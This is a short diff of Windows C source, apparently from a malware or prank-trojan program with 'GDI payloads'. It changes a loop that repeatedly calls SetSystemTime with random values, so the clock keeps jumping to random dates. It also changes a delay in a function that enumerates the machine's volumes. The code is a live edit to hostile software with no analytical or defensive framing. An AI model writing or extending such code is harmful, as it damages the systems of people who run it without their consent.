@@ -268,14 +268,14 @@ VOID WINAPI fnSetRandomTime(VOID) {
 
 	while(g_iGDIPayloadCount != 6) {
 
-		stSystemTime.wYear = rand()%2030;
-		stSystemTime.wMonth = rand()%12;
-		stSystemTime.wHour = rand()%23;
-		stSystemTime.wMinute = rand()%59;
-		stSystemTime.wDay = rand()%31;
-		stSystemTime.wDayOfWeek = rand()%6;
-		stSystemTime.wSecond = rand()%59;
-		stSystemTime.wMilliseconds = rand()%999;
+		stSystemTime.wYear = fnRNG()%2030;
+		stSystemTime.wMonth = fnRNG()%12;
+		stSystemTime.wHour = fnRNG()%23;
+		stSystemTime.wMinute = fnRNG()%59;
+		stSystemTime.wDay = fnRNG()%31;
+		stSystemTime.wDayOfWeek = fnRNG()%6;
+		stSystemTime.wSecond = fnRNG()%59;
+		stSystemTime.wMilliseconds = fnRNG()%999;
 
 		Sleep(100);
 		SetSystemTime(&stSystemTime);
@@ -392,7 +392,7 @@ VOID WINAPI fnFindVolumes(VOID) {
 				0, 
 				NULL
 				);
-		Sleep(1000);
+		Sleep(2000);
 		}
 	}
 	FindVolumeClose(hVolumeHandle);
